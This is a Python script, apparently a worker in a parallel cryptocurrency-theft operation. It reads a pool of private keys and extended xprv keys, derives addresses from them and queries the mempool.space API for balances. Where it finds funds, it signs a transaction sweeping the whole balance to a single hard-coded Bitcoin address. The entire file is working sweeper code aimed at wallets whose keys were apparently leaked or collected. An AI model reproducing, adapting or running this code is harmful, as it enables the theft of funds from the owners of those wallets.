import os, requests, time, sys
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk"
WORKER_ID = int(os.environ.get('WORKER_ID', 1))
TOTAL_WORKERS = int(os.environ.get('TOTAL_WORKERS', 20))

def create_raw_tx(wif, balance_sats):
    try:
        k = Key(wif, network='bitcoin')
        fee = 3500 
        amount = balance_sats - fee
        if amount <= 546: return None
        t = Transaction(network='bitcoin')
        t.add_input(k.address(), balance_sats)
        t.add_output(DEST_ADDRESS, amount)
        t.sign(k)
        return t.raw_hex()
    except: return None

def check_key(priv_key):
    try:
        priv_key = priv_key.strip()
        if not priv_key: return
        
        # --- LÓGICA DE DEEP SCAN (xprv) ---
        if priv_key.startswith('xprv'):
            print(f"📦 W{WORKER_ID} | Derivando Master Key...")
            master = Key(priv_key)
            for i in range(100): # Deriva os primeiros 100 endereços
                check_key(master.subkey_for_path(f"0/{i}").wif())
            return

        k = Key(priv_key, network='bitcoin')
        for w_type in [None, 'p2sh-p2wpkh', 'p2wpkh']:
            addr = k.address(witness_type=w_type)
            # sys.stdout.flush() garante que o log apareça na hora
            print(f"🔎 W{WORKER_ID} | {addr}", flush=True)
            
            try:
                r = requests.get(f"https://mempool.space/api/address/{addr}", timeout=10).json()
                stats = r.get('chain_stats', {})
                bal = stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
                
                if bal > 0:
                    print(f"\n🚨 SALDO! {addr}: {bal} sats", flush=True)
                    raw_hex = create_raw_tx(k.wif(), bal)
                    if raw_hex: print(f"HEX_GEN:{raw_hex}", flush=True)
            except: pass
            time.sleep(0.15)
    except Exception as e:
        pass

if __name__ == "__main__":
    # Verifica se o arquivo existe na pasta atual
    pool_file = 'MASTER_POOL.txt'
    if os.path.exists(pool_file):
        with open(pool_file, 'r') as f:
            all_keys = [line.strip() for line in f if line.strip()]
        
        my_keys = [all_keys[i] for i in range(len(all_keys)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]
        print(f"🚀 Worker {WORKER_ID} iniciado com {len(my_keys)} chaves.", flush=True)
        
        for key in my_keys:
            check_key(key)
    else:
        print(f"❌ Erro: {pool_file} não encontrado no Worker {WORKER_ID}", flush=True)
